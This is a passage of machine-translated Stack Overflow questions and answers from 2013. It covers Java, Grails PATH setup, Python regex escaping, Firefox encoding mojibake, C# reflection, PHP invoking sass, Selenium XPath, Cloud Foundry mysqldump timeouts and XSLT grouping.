您可以使用该`split`方法接收`Array`. 将`Array`转换为 a`List`将允许您使用一些辅助函数，例如`contains`and `indexOf`，可用于返回标记是否存在或标记的位置。

```
String value = "13,14,15,16,17";

//Checks existence
boolean contains = Arrays.asList(value.split(",")).contains("16");

//Returns position
int pos = Arrays.asList(value.split(",")).indexOf("16") + value.split(",").length + 1; 
```

这些示例都使用 Java。

* * *

## 回答 #5

> 赞同：0
> 
> 时间：2013-02-20T10:24:37.497

不太明白你的问题。

> 不知道有多少个数字用逗号分隔

使用字符串方法 split()

> 我想与变量进行比较： String varValue = "16"

使用字符串方法 contains()

# charts - 如何在 SSRS 2008 上放置价值轴（Y）

> ID：14977394
> 
> 赞同：0
> 
> 时间：2013-02-20T10:20:13.630
> 
> 标签：charts, ssrs-2008, reporting-services

我有一个显示运行总计的简单折线图。它从 0 开始到数千。我想将值（Y）轴移动到图表的右侧，以便更清晰。或者，我想把价值轴放在两边。

我找不到那个选项。

我使用 SQL Server 2008。

非常感谢

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-02-20T10:26:51.067

成立于年底：

1.  右键单击数据列
2.  选择轴和图表区域
3.  选择次轴

如果您在图表上两次放置相同的数据字段，则可以在两侧显示轴。

# grails - 运行 grails 项目时出现 java.io.IOException

> ID：14977406
> 
> 赞同：2
> 
> 时间：2013-02-20T10:20:55.393
> 
> 标签：grails, ubuntu-12.04, grails-2.0

我从朋友那里得到了一个 grails 项目，我在 GGTS 中导入了该项目，在我刷新依赖项后，我没有错误。

当我试图跑步时，我得到了

**错误 执行脚本时出错 RunApp: java.io.IOException: Cannot run program "grails": java.io.IOException: error=2, No such file or directory (使用 --stacktrace 查看完整跟踪)**

我正在使用 Ubuntu 12.4。

但是，我在另一个运行 Windows 7 的系统中导入了相同的项目，我在 Windows 中没有收到任何错误或异常。

这个异常的原因是什么？

## **回显 $PATH** 输出

/home/ard006/Documents/senchaCmd/Sencha/Cmd/3.0.0.250:/home/ard006/Viswa/scala/sbt/bin:/home/ard006/Documents/senchaCmd/Sencha/Cmd/3.0.0.250:/usr/ lib/lightdm/lightdm:/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/usr/games:/home/ard006/Viswa/springsource/ grails-2.1.2/bin:/home/ard006/groovy-2.0.0/bin

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-02-20T10:26:03.907

在我看来，GGTS 找不到 grails 可执行文件。

是在你的`PATH`吗？我怀疑您需要这样设置`PATH`变量：

```
$ PATH=$GRAILSHOME/bin:$PATH 
```

然后从该外壳调用 GGTS，使其继承`PATH`设置（我假设`PATH`已导出）

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2014-03-13T12:10:34.027

只是遇到同样的问题。

我在 .bash.rc 文件中使用此符号的路径上有 Grails bin 文件夹

```
export PATH="${PATH}:~/grails/bin" 
```

波浪号打破了它，我将其更改为：

```
export PATH="${PATH}:/home/myuser/grails/bin" 
```

现在它正在工作，IOException 消失了。

# python - 如何在 Python 中转义所有未转义的斜杠

> ID：14977410
> 
> 赞同：1
> 
> 时间：2013-02-20T10:21:00.337
> 
> 标签：python, regex

我在 Python 中有一条部分转义的路径，如下所示：

```
path = "C:\\Temp\\\\TestEmpty" # Actual value = C:\Temp\\TestEmpty 
```

我想让所有的斜线都像这样加倍：

```
escapedpath = "C:\\\\Temp\\\\TestEmpty" # Actual value = C:\\Temp\\TestEmpty 
```

我从一些正则表达式开始

```
escapedpath = re.sub("[a-zA-Z0-9 _:-](\\)[a-zA-Z0-9 _:-]", "\\\\", path) 
```

...但是当然这会删除`\\`s之前和之后的字符

怎么可能做到这一点？

* * *

## 回答 #1

> 赞同：4
> 
> 时间：2013-02-20T10:25:08.417

```
result = re.sub(r"""(?x)
    (?<!\\)     # Make sure that there is no backslash before the current position
    \\          # Match a backslash
    (?=         # only if...
     (?:\\\\)*  # an even number of backslashes follows (including zero)
     (?!\\)     # and no further backslashes follow after that
    )           # (End of lookahead assertion)""", 
    r"\\\\", subject) 
```

仅当此时连续反斜杠的数量为奇数时才替换反斜杠。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2013-02-20T12:08:34.530

你不需要正则表达式，如果你只是做一个简单的字符串替换来加倍所有的反斜杠，然后另一个字符串替换来取消已经加倍的那些，那么你就到了你想去的地方：

```
>>> path = "C:\\Temp\\\\TestEmpty"
>>> path.replace('\\','\\\\').replace(r'\\\\', r'\\')
'C:\\\\Temp\\\\TestEmpty' 
```

或者先将加倍的反斜杠取消加倍，然后将所有反斜杠加倍：

```
>>> path.replace('\\\\', '\\').replace('\\', '\\\\')
'C:\\\\Temp\\\\TestEmpty' 
```

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2017-07-31T16:18:49.677

我使用以下组合来回避一点：

```
escaped_path = re.sub( r'(\\)+', '/', path).replace('/', '\\') 
```

*（它的额外好处是对某人（我）可能通过贪婪地替换反斜杠而错误地输入的路径进行基本卫生处理。）*

# firefox - Firefox 更新后中文跨域 XmlHTTPRequest

> ID：14977414
> 
> 赞同：3
> 
> 时间：2013-02-20T10:21:20.667
> 
> 标签：firefox, xmlhttprequest, cross-domain

我的 Firefox 刚刚进行了更新，现在我所有的`XMLHttpRequest`（10 分钟前工作的）用中文回答......

我可以在 firebug 中将其读为 responseText ：

> 㰿硭氠症牳楯渽∱⸰∠敮捯摩涌㴢昭ㄶ∿㸍਼㽸浬⵳瑹汥独敥琠瑹灥㴧瑥硴⽸獬✠桲桲桲敦㴧⽯扩砯硳扇㼾ഊ㱱⽯攽⽲⽯慡保卫㌢牥昽⽨瑑牒敬愳ㄲ㈾⽯扩砳㠲㠾㠓㠓㌯〙捥⽷ちちの㌯牥昽⽷ࠢね殥〱舍ㄥㄉ浉⽯慭攽≬敡獥∠桲敦㴢汥悭支∠睲楴慢汥㴢玱略∠氽≐掱玱∠≡氽≐玱玥⁭楮㴢偔こ∠⼾ഊ†㱩湴⁮慭攽摤䙲敱略湣礢牥≡痴摤䙲敱略湣礯∠睲楴慢汥㴢玱略∠浩氽∵〰∠浩渽∰∠⼾ഊ†㱯慤湡浥㴢慤湡浥㴢慤搢牥昽≡植物摤⼢渽≯扩⁯畴㴢潢并琢ਠ！溃⁮≲敭潶攒≲≲敭潶支支支楮㴢潢楸㩗慑舍䥮楮㴢潢楸㩗慑舍䥮楮㴢潢楸㩗慑舍䥮楮㴢潢楸㩗慑舍䥮楮㴢潢楸㩗慑舍䥮楮㴢潢楸㩗慑舍䥮∠潬潬扱ㅠ㱠涌∠汬䍬栲栲桲戴栴汬栬栲潡桥祵剥琽≯摊铺路潊桏祵剥琽≯扩路浥†㱴汯汬汬沬沥桲戴汸汬佬栲潡桥祸剥琽≯拓荒路潊潵祯剥琽∠扬沥㡏㱯汬目牰潬潬潬扬扥独氢⼢≱拓拓扱扥乩乩目睹の撘牍⁩目睹の梘牍⁩㩗目睹の楘牍⁩㩗目睹の楸牍⁩〼溃烂⁮の戥≤敬琢整攒牥昭洽洠楸整支≠楮昴楸楸⼠㹠潵琯琯≯潵琯潵琯≯潵潵琯≯扩䠩潵罉攽≳牥昽≳牥昽≳牬潵琯琯≯潵潵琯潵琽≯扩扪潵潵牑扉≯扩⽯瑡琢㸉

这很有趣，但我真的很想得到我真正的答案。

你知道我是否可以更改设置或其他内容吗？

要知道的重要一点是，我的 ajax 代码是一个跨域请求。http标头编码是否有可能发生了变化？

非常感谢 ！

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-11-19T08:56:22.380

Firefox 现在将 UTF-16 BOM 优先于 HTTP。这不是倒退，而是有意的改变。如果后面的字节不是 UTF-16，最好不要使用 UTF-16 BOM！

# c++ - 死锁 - 从主线程创建 QThread

> ID：14977420
> 
> 赞同：0
> 
> 时间：2013-02-20T10:21:37.613
> 
> 标签：c++, linux, qt, qt4

我正在尝试调试 2 个线程被锁定在同一个互斥体（QMutex）上的情况。两个线程之间的连接是 - 一个线程是从另一个线程创建的。即首先是主线程（gui线程），我从中创建用户定义类的另一个对象。从这个对象的构造函数中创建了一个新线程。这是错误的用法吗？

```
//Some part of Code:

void main()
{
  MyMainThread *obj = new MyMainThread(); // this class inherits QWidget
}

//This class declaration is in another file
class Someobj
{
  SomeObj()
  {
  }
  StartAnotherObjThread()
  {
     AnotherObjthread obj = new AnotherObjThread(this);
     obj->start();       
  }
}

MyMainThread()
{
  SomeObj *obj = new SomeObj();
  obj->StartAnotherObjThread();
} 
```

# c# - 获取包含属性内容的数组

> ID：14977424
> 
> 赞同：1
> 
> 时间：2013-02-20T10:21:59.097
> 
> 标签：c#

我在 C# 的代码中有一个类，我想从数组中的嵌套类中获取所有属性，其中包含参数数量的大小以及对象数组中所有参数的内容。像这些：

```
class MyClass {
 class Parameters {
  public const string A = "A";
  public const string B = "B";
  public const string C = "C";
  public const string D = "D";
  public const string E = "E";
  public const string F = "F";
 }    

 public object[] getAllParameters() {
    object[] array = new object[6];
    array[0] = Parameters.A;
    array[1] = Parameters.B;
    array[2] = Parameters.C;
    array[3] = Parameters.D;
    array[4] = Parameters.E;
    array[5] = Parameters.F;
}       
//more methods and code 
```

}

但是，如果我想添加例如`G`和`H`参数，我将不得不更新方法的大小`getAllParameters`、初始化以及代码其他部分的更多内容。

我可以在`getAllParameters`不考虑显式参数的情况下更通用地执行此“”方法吗？也许有反射？

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2013-02-20T10:29:59.357

因为字段是常量，所以您不需要对象实例，只需使用`null`in `GetValue`。另外 - 这些是字段，而不是属性。

```
 var fields = typeof(Parameters).GetFields();
  object[] array = new object[fields.Count()];
  for (int i = 0; i < fields.Count(); i++)
  {
    array[i] = fields[i].GetValue(null);
  }
  return array; 
```

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2013-02-20T10:24:22.640

您想要的是将类序列化为数组，那么为什么要重新发明轮子呢？使用现有的对象序列化方法并根据您的特定需要对其进行自定义。

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2013-02-20T10:25:56.607

这似乎是一种奇怪的方法，但它是可能的。您需要对象的实例和它的类型，然后您可以获取该类型的所有属性，遍历它们中的每一个并获取所述类的实例中每个所述属性的值。

```
TestClass obj = new TestClass();
Type t = typeof(TestClass);
foreach (var property in t.GetProperties())
{
    var value = property.GetValue(obj);
} 
```

* * *

## 回答 #4

> 赞同：0
> 
> 时间：2013-02-20T10:26:51.730

您可以使用反射来做到这一点。

```
typeof(MyClass).GetFields (); 
```

将返回一个 FieldInfo 数组。你面包车然后通过使用获取每个字段的值

```
filedinfo.GetValue (myobject); 
```

* * *

## 回答 #5

> 赞同：0
> 
> 时间：2013-02-20T10:28:53.407

使用反射。这是一个例子：

```
class A
{
    public string F1;
    public string F2;
} 
```

在方法中：

```
var a = new A();
var fields = typeof (A).GetFields();

var values = from fieldInfo in fields
             select fieldInfo.GetValue(a); 
```

* * *

## 回答 #6

> 赞同：-1
> 
> 时间：2013-02-20T10:25:57.380

您可以将[Type.GetProperties](http://msdn.microsoft.com/en-us/library/kyaxdd3x.aspx)与[PropertyInfo.GetValue结合使用](http://msdn.microsoft.com/en-us/library/system.reflection.propertyinfo.getvalue.aspx)

# exception-handling - WebApi Controller 构造函数中失败的正确方法是什么

> ID：14977426
> 
> 赞同：1
> 
> 时间：2013-02-20T10:22:04.270
> 
> 标签：exception-handling, asp.net-web-api, constructor-injection

我有一个 WebApi 控制器，它需要通过它的构造函数提供服务。如果此服务为空，我通常会抛出一个`NullArguementException`. 这仍然是在 WebApi 控制器的上下文中失败的正确方法，还是有不同的模式。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-02-20T10:54:09.680

图案是一样的。尽管使用 DI 这会在调用构造函数之前失败。

# php - 从 PHP 运行 SASS 时出现错误 127

> ID：14977430
> 
> 赞同：0
> 
> 时间：2013-02-20T10:22:24.393
> 
> 标签：php, ruby, macos, rvm, sass

我正在尝试使用 PHP 中的 SASS，但我总是收到 127 错误。

这是我正在做的事情：

```
$command = 'sass pathtomyfile.scss:pathtomyfile.css';

system($command, $return); 

echo $return; // give me: 127 
```

如果我在终端中运行完全相同的命令，一切正常。请注意，我正在尝试在 Mac OS X 上执行此操作。

**编辑：**我相信这是一个权限问题，但我不知道如何解决这个问题。

**编辑 2：**我正在使用 rvm

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-02-20T12:03:40.570

`127`错误是`command not found`确保`PATH`正确设置`sass`为安装命令的位置或命令的完整路径，您可以`sass`通过在 shell 中运行找到完整路径`which sass`。

当你使用 RVM 时，你可以确保正确的环境与包装器一起使用：

```
$ rvm use 1.9.3 --install
$ gem install sass
$ rvm wrapper 1.9.3 php sass
$ which php_sass
/home/user/.rvm/bin/php_sass 
```

并使用返回的路径运行`sass`。

# workflow-foundation-4 - 停止 Windows 工作流活动

> ID：14977431
> 
> 赞同：0
> 
> 时间：2013-02-20T10:22:26.067
> 
> 标签：workflow-foundation-4, workflow-foundation

实际上我正在开发一个使用 Windows 工作流基础（状态机工作流）的应用程序，最初我们在状态持久性存储中找不到错误“带有 ID 的工作流”“XXXX”，我们找到了根本原因，这是由于我们的工作流程已完成的原因，但在特定情况下不应完成。

如何在某些条件下停止 Windows Workflow 基础

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-02-20T12:00:14.327

使用[TerminateWorkflow](http://msdn.microsoft.com/en-us/library/system.activities.statements.terminateworkflow.aspx)活动。

# database - 如何使客户端PC独立于服务器工作

> ID：14977434
> 
> 赞同：1
> 
> 时间：2013-02-20T10:22:35.067
> 
> 标签：database, security, design-patterns, web-applications, database-design

（对不起，我不知道我应该在stackoverflow或其他相关网站上问这个问题。如果不合适，请移动它）

有一些不相关的学生群体，每个群体成员一起产生数据。每个成员都使用他的凭据登录到客户端桌面应用程序并将数据发送到服务器。如果其他组成员使用他们的凭据登录，他们应该会看到新数据。

当我想让客户端工作时，问题就出现了，尽管与服务器的连接出错了。如果他们无法连接到服务器，我不想阻止他们，所以他们制作数据，然后将其发送到服务器。

**问题来了，在不连接服务器的情况下，我怎样才能在客户端建立成员资格并确保他确实属于该组，或者我如何知道其他成员在本地计算机中有新数据以便他的同事可以看到呢？**

我不想使用另一台本地服务器，只是一台远程服务器和一台带数据库的本地机器。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-02-20T16:26:39.193

如果服务器不可用，那么知道一个人是否在组中的唯一方法是您是否将该信息存储在客户端上。当然，可以从组中删除某人并且（断开连接的）客户端不知道它。

解决这个问题将取决于您的系统是如何使用的。

1.  如果会员资格不经常更改，您可以使用客户保存的会员资格，只要它不是太旧（例如，如果它小于 4 小时，或一些类似的规则就使用它）。
2.  每当客户端重新连接到服务器时，它应该确保其本地数据在超过 N 小时时被刷新
3.  另外，当重新建立连接，将数据发送到服务器时，服务器应该再次检查。如果用户已从组中删除，服务器可以拒绝数据

# iphone - 为什么发布版本有时会崩溃，而调试版本则不会？

> ID：14977436
> 
> 赞同：0
> 
> 时间：2013-02-20T10:22:40.207
> 
> 标签：iphone, xcode, release

我发现我的应用程序在发布版本（例如 TestFlight 的版本）时多次崩溃。但调试版本没有。

为什么这甚至可能？是什么让发布版本与调试版本如此不同？以及如何找出导致发布版本崩溃的原因？

我修改了我的运行方案以使用 TestFlight 构建配置，当我使用它时，应用程序崩溃了。Xcode 在设备上安装并运行后也无法将其自身附加到应用程序。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-02-20T10:31:05.320

有许多可能的原因 - 如果您从 XCode 运行调试构建，则应用程序看门狗被禁用以允许调试器附加。在正常情况下，如果您的应用程序未能在特定时间范围内启动，您的应用程序可能会被终止。其他潜在原因可能是您使用的第三方库具有不同的发布/调试设置。如果不了解您的应用程序，很难说出根本原因是什么。

好消息是，虽然您可以从 XCode 中“调试”发布版本，但您*可以*使用它来表示您的发布版本崩溃日志。这将为您提供发生崩溃的确切行号，并帮助您追踪问题。

# c# - 在 winRT gridview 中显示视频图像

> ID：14977437
> 
> 赞同：0
> 
> 时间：2013-02-20T10:22:40.780
> 
> 标签：c#, xaml, windows-runtime, winrt-xaml, mediaelement

我正在开发一个 Windows 8 应用商店应用程序，我遇到了这个问题，我希望用户从文件选择器中添加视频并管理它，问题是我想在 GridView 中显示视频图像，比如快照视频在某个位置，我尝试了媒体元素，它也无法正常工作，图像也没有意义。

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-02-21T09:49:27.467

您在其他地方引用的您自己的解决方案至少适用于某些视频：

```
var thumb = await
    storageFile.GetThumbnailAsync(
        Windows.Storage.FileProperties.ThumbnailMode.PicturesView,
        1000,
        Windows.Storage.FileProperties.ThumbnailOptions.UseCurrentScale); 
```

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2013-02-21T05:51:33.657

这个问题可能没有纯 C# 解决方案。也许 SharpDX 会让你这样做，但我没有尝试过，我不知道以前是否做过。如果你看这两个线程：

[http://social.msdn.microsoft.com/Forums/fil-PH/wingameswithdirectx/thread/05731d4f-5b7f-4ed1-8e28-94604655139e](http://social.msdn.microsoft.com/Forums/fil-PH/wingameswithdirectx/thread/05731d4f-5b7f-4ed1-8e28-94604655139e)

[http://social.msdn.microsoft.com/Forums/en/wingameswithdirectx/thread/ffacd05c-6e9e-43bf-b691-99127240730c](http://social.msdn.microsoft.com/Forums/en/wingameswithdirectx/thread/ffacd05c-6e9e-43bf-b691-99127240730c)

-- 您应该看到有一种[`TransferVideoFrame`](http://msdn.microsoft.com/en-us/library/windows/desktop/hh448021%28v=vs.85%29.aspx)方法可用于将帧从视频流复制到 DirectX 纹理。媒体引擎原[生 C++ 视频播放示例](http://code.msdn.microsoft.com/windowsapps/Media-Engine-Playback-ce1c82f0/)展示了如何原生使用它。如果您搜索 TransferVideoFrame+SharpDX - 您可以找到在 C#中使用[此方法的 SharpDX 版本的](http://sharpdx.org/documentation/api/t-sharpdx-mediafoundation-mediaengine)[示例。](http://code.google.com/p/sharpdx/source/browse/#git/Samples/Win8/MiniCubeVideoTexture)将该帧传输到纹理后 - 您可以使用[此处](http://msdn.microsoft.com/en-us/library/windows/desktop/bb205131%28v=vs.85%29.aspx)的和方法将纹理的内容复制到 a 中。您也可以使用此处将其保存到文件中，[或者](http://winrtxamltoolkit.codeplex.com/SourceControl/changeset/view/f7a69dc2a5d9#WinRTXamlToolkit/Imaging/WriteableBitmapSaveExtensions.cs)直接从 DirectX 纹理使用 WIC 将其保存到文件中，或者说 SharpDX Toolkit，如此[处](http://code.google.com/p/sharpdx/source/search?q=texture%20save&origq=texture%20save&btnG=Search%20Trunk)`WriteableBitmap``Map``Unmap``BitmapEncoder`. 您可能希望构建缩略图缓存以避免每次显示列表时都必须处理视频，因此无论如何都应该保存到文件中。

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2015-07-02T04:47:46.143

我建议使用`GetThumbnailAsync()`，它也同样有效。您甚至不需要获取视频属性或类似的东西。如果加载了 StorageFile，这应该适用于任何格式的普通视频。

# java - 如何使用 Java 在 Selenium WebDriver 中获取 webtable 中的确切行数

> ID：14977438
> 
> 赞同：1
> 
> 时间：2013-02-20T10:22:51.610
> 
> 标签：java, xpath, webdriver, selenium-webdriver

![行数的屏幕截图](../Images/e96875b123639f16a368f3fe4fe76e12.png)

如何在使用 Java 的 webdriver 中使用 xpath 获取 webtable 中的确切行数。使用下面的 xpath，我也可以使用标题进行计数。我不希望计数包括标题行并获取 webtable 的计数。

```
//table[@id='ctl00_MasterPlaceHolder_GrdHistory']/tbody/tr 
```

HTML 代码：

```
<table id="ctl00_MasterPlaceHolder_GrdHistory" cellspacing="2" cellpadding="0" border="0" style="color:#333333;width:100%;">
<tbody>
<tr style="color:Black;background-color:#DFC065;font-weight:bold;">
<tr style="background-color: rgb(251, 247, 234); text-decoration: none;"   onclick="javascript:__doPostBack('ctl00$MasterPlaceHolder$GrdHistory','Select$0')" onmouseout="javascript:setMouseOutColor(this);" onmouseover="javascript:setMouseOverColor(this);">
<tr style="background-color: rgb(251, 247, 234); text-decoration: none;" onclick="javascript:__doPostBack('ctl00$MasterPlaceHolder$GrdHistory','Select$1')" onmouseout="javascript:setMouseOutColor(this);" onmouseover="javascript:setMouseOverColor(this);">
<tr style="background-color: rgb(251, 247, 234); text-decoration: none;" onclick="javascript:__doPostBack('ctl00$MasterPlaceHolder$GrdHistory','Select$2')" onmouseout="javascript:setMouseOutColor(this);" onmouseover="javascript:setMouseOverColor(this);">
<tr style="background-color: rgb(251, 247, 234); text-decoration: none;" onclick="javascript:__doPostBack('ctl00$MasterPlaceHolder$GrdHistory','Select$3')" onmouseout="javascript:setMouseOutColor(this);" onmouseover="javascript:setMouseOverColor(this);">
<tr style="background-color: rgb(251, 247, 234); text-decoration: none;" onclick="javascript:__doPostBack('ctl00$MasterPlaceHolder$GrdHistory','Select$4')" onmouseout="javascript:setMouseOutColor(this);" onmouseover="javascript:setMouseOverColor(this);">
<tr style="background-color: rgb(251, 247, 234); text-decoration: none;" onclick="javascript:__doPostBack('ctl00$MasterPlaceHolder$GrdHistory','Select$5')" onmouseout="javascript:setMouseOutColor(this);" onmouseover="javascript:setMouseOverColor(this);">
<tr style="background-color: rgb(251, 247, 234); text-decoration: none;" onclick="javascript:__doPostBack('ctl00$MasterPlaceHolder$GrdHistory','Select$6')" onmouseout="javascript:setMouseOutColor(this);" onmouseover="javascript:setMouseOverColor(this);">
<tr style="background-color: rgb(251, 247, 234); text-decoration: none;" onclick="javascript:__doPostBack('ctl00$MasterPlaceHolder$GrdHistory','Select$7')" onmouseout="javascript:setMouseOutColor(this);" onmouseover="javascript:setMouseOverColor(this);">
<tr style="background-color: rgb(251, 247, 234); text-decoration: none;" onclick="javascript:__doPostBack('ctl00$MasterPlaceHolder$GrdHistory','Select$8')" onmouseout="javascript:setMouseOutColor(this);" onmouseover="javascript:setMouseOverColor(this);">
<tr style="background-color: rgb(251, 247, 234); text-decoration: none;"  onclick="javascript:__doPostBack('ctl00$MasterPlaceHolder$GrdHistory','Select$9')" onmouseout="javascript:setMouseOutColor(this);" onmouseover="javascript:setMouseOverColor(this);">
<tr style="background-color: rgb(251, 247, 234); text-decoration: none;" onclick="javascript:__doPostBack('ctl00$MasterPlaceHolder$GrdHistory','Select$10')" onmouseout="javascript:setMouseOutColor(this);" onmouseover="javascript:setMouseOverColor(this);">
<tr style="background-color: rgb(251, 247, 234); text-decoration: none;" onclick="javascript:__doPostBack('ctl00$MasterPlaceHolder$GrdHistory','Select$11')" onmouseout="javascript:setMouseOutColor(this);" onmouseover="javascript:setMouseOverColor(this);">
<tr style="background-color: rgb(251, 247, 234); text-decoration: none;" onclick="javascript:__doPostBack('ctl00$MasterPlaceHolder$GrdHistory','Select$12')" onmouseout="javascript:setMouseOutColor(this);" onmouseover="javascript:setMouseOverColor(this);">
<tr style="background-color: rgb(251, 247, 234); text-decoration: none;" onclick="javascript:__doPostBack('ctl00$MasterPlaceHolder$GrdHistory','Select$13')" onmouseout="javascript:setMouseOutColor(this);" onmouseover="javascript:setMouseOverColor(this);">
<tr style="background-color:#FBF7EA;" onclick="javascript:__doPostBack('ctl00$MasterPlaceHolder$GrdHistory','Select$14')" onmouseout="javascript:setMouseOutColor(this);" onmouseover="javascript:setMouseOverColor(this);">
<tr style="background-color:#FBF7EA;" onclick="javascript:__doPostBack('ctl00$MasterPlaceHolder$GrdHistory','Select$15')" onmouseout="javascript:setMouseOutColor(this);" onmouseover="javascript:setMouseOverColor(this);"> 
```

这可能吗，如果是这样，那么我如何在不包括标题行的情况下获得计数。请帮助我。帮助将不胜感激。

* * *

## 回答 #1

> 赞同：6
> 
> 时间：2013-02-20T10:38:51.780

使用下面的 xpath 排除第一行（标题）

```
//table[@id='ctl00_MasterPlaceHolder_GrdHistory']/tbody/tr[position()>1] 
```

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2013-02-25T12:22:48.993

试试这个代码：

```
int count = (driver.findElements(By.xpath("//table[@id='ctl00_MasterPlaceHolder_GrdHistory']/tbody/tr")).size()) - 1; 
```

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2013-02-20T13:30:09.887

我建议 ：

```
 count(table[@id="ctl00_MasterPlaceHolder_GrdHistory"]/tbody/tr) - 1 
```

# mysqldump - Cloudfoundry：VMC：错误 1317：mysqldump 上的查询执行被中断

> ID：14977441
> 
> 赞同：0
> 
> 时间：2013-02-20T10:22:53.363
> 
> 标签：mysqldump, cloud-foundry, vmc

转储我的 cloudfoundry 部署的 mysql 数据库对我来说非常重要。我正在使用 cloudfoundry 的 vmc，并且与该服务的连接运行良好。然而 mysqldump 总是失败，这让我处于一个糟糕的境地，因为我基本上无法转储数据来进行本地迁移测试。cloudfoundry / vmc 出现的错误是：

mysqldump：错误 1317：在第 28 行转储表“foo”时查询执行被中断

这似乎是由 cloudfoundry 中的某些设置导致的，该设置会终止任何耗时超过 3 秒的查询。参见例如

*   [mysqldump：错误 1317：运行数据库备份时查询执行被中断](https://stackoverflow.com/questions/14021070/mysqldump-error-1317-query-execution-was-interrupted-while-running-database-ba)

*   [CloudFoundry 上的 MySql 经常因查询执行中断而失败；](https://stackoverflow.com/questions/12065461/mysql-on-cloudfoundry-often-fails-with-query-execution-was-interrupted)

无论如何更改配置或让cloudfoundry忽略mysqldump的3秒规则？有什么建议么？

PS：如果迁移的执行需要很长时间，这个超时也被证明是非常具有破坏性的。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-02-20T18:03:25.770

根据您与 CloudFoundry.com 之间的连接质量，此类超时可能是个问题。可能值得看一下我编写的一个 Ruby 应用程序，用于对 MySQL 数据库进行例行备份并将它们上传到云服务提供商，例如 Amazon S3。

查看[https://github.com/danhigham/service_stash上的存储库](https://github.com/danhigham/service_stash)

设置非常简单，但是如果您遇到困难，请告诉我。

# c# - XAML 中的 Windows 8 商店应用程序中的 TreeView

> ID：14977451
> 
> 赞同：5
> 
> 时间：2013-02-20T10:23:17.460
> 
> 标签：c#, windows, xaml, windows-runtime, winrt-xaml

据我所知，Windows 8 商店应用程序中没有树视图控件，有人知道替代解决方案吗？我想在单击标题时显示一些带有折叠和展开的父子数据，但这在 Windows 的 GridView 和 ListView 中是不可能的8\. 任何人都可以帮助我吗？

* * *

## 回答 #1

> 赞同：6
> 
> 时间：2013-04-08T20:17:42.657

WinRT XAML Toolkit 中有一个[TreeView 控件](https://winrtxamltoolkit.codeplex.com/SourceControl/changeset/view/9c814f6c67c540adbd6952821a351d9ffa4d1d99#WinRTXamlToolkit/Controls/TreeView/TreeView.cs)，它是从 Silverlight Toolkit 移植的。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2013-02-28T03:23:43.750

来自 Syncfusion WinRT Studio 的 Tree Navigator 控件可能有助于满足您的要求。它支持分层数据绑定。它还具有两种不同的导航模式。该控件提供了一个独特的界面，可以在不占用屏幕更多空间的情况下就地扩展树结构。

[http://www.syncfusion.com/products/winrt/controls](http://www.syncfusion.com/products/winrt/controls)

# xslt - xpath 中的 xsl 子字符串

> ID：14977452
> 
> 赞同：0
> 
> 时间：2013-02-20T10:23:18.193
> 
> 标签：xslt, xslt-1.0

所以我想做的是从 xml 中获取日期中所有唯一的年份，然后遍历年份以获取该年份的所有结果。下面的代码可以工作到一定程度，但目前它只返回唯一的完整日期，因为我无法弄清楚如何通过日期字符串的一部分（前四个字符，例如 2012）获取唯一值。我想在 xpath 中使用子字符串，但我尝试过的一切似乎都失败了。有谁知道我应该在这里做什么？

所以我想要返回的第一个结果是这些值 2012,2011,2010。

这是我在下面使用的代码 - 使用 xslt 1.0。我对使用 xslt 比较陌生，所以我可能会遗漏一些简单的东西......

```
<!-- key at top of document -->
<xsl:key name="product" match="gdr:CompanyHistory/gdr:Event/gdr:Date" use="." />

<xsl:for-each select="gdr:CompanyHistory/gdr:Event/gdr:Date[generate-id()=generate-id(key('product',.)[1])]">
        <strong>Year = <xsl:value-of select="substring(., 1, 4)"/></strong>
        <ul>
          <xsl:variable name="Date" select="."/>
          <!-- foreach year get all results that have dates in that year.   -->
          <xsl:for-each select="gdr:CompanyHistory/gdr:Event[substring(gdr:Date, 1, 4) = $Date]">
              <li><xsl:value-of select="gdr:Description" /> - <xsl:value-of select="gdr:Date" /></li>
          </xsl:for-each>
        </ul>
      </xsl:for-each> 
```

xml

```
<CompanyHistory>
<Event>
    <Date>2012-02-16T00:00:00</Date>
    <Description>description</Description>
</Event>
<Event>
    <Date>2012-02-01T00:00:00</Date>
    <Description>description</Description>
</Event>
<Event>
    <Date>2011-03-01T00:00:00</Date>
    <Description>description</Description>
</Event>
<Event>
    <Date>2011-04-01T00:00:00</Date>
    <Description>description</Description>
</Event>
<Event>
    <Date>2010-01-26T00:00:00</Date>
    <Description>description</Description>
</Event>
<Event>
    <Date>2010-01-16T00:00:00</Date>
    <Description>description</Description>
</Event>
</CompanyHistory> 
```

我希望这有点道理。注意：我缩短了完整的 xpath 以使其更具可读性。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-02-20T11:13:11.823

我将只为年份定义键，然后使用 Muenchian 分组。所以样式表是

```
<xsl:stylesheet
  xmlns:xsl="http://www.w3.org/1999/XSL/Transform"
  version="1.0">

<xsl:output method="html" indent="yes"/>

<xsl:key name="year" match="CompanyHistory/Event" use="substring(Date, 1, 4)"/>

<xsl:template match="CompanyHistory">
   <xsl:apply-templates select="Event[generate-id() = generate-id(key('year', substring(Date, 1, 4))[1])]" mode="group"/>
</xsl:template>

<xsl:template match="Event" mode="group">
  <h2>Year = <xsl:value-of select="substring(Date, 1, 4)"/></h2>
  <ul>
    <xsl:apply-templates select="key('year', substring(Date, 1, 4))"/>
  </ul>
</xsl:template>

<xsl:template match="Event">
  <li>
    <xsl:value-of select="Description"/>
    <xsl:text> - </xsl:text>
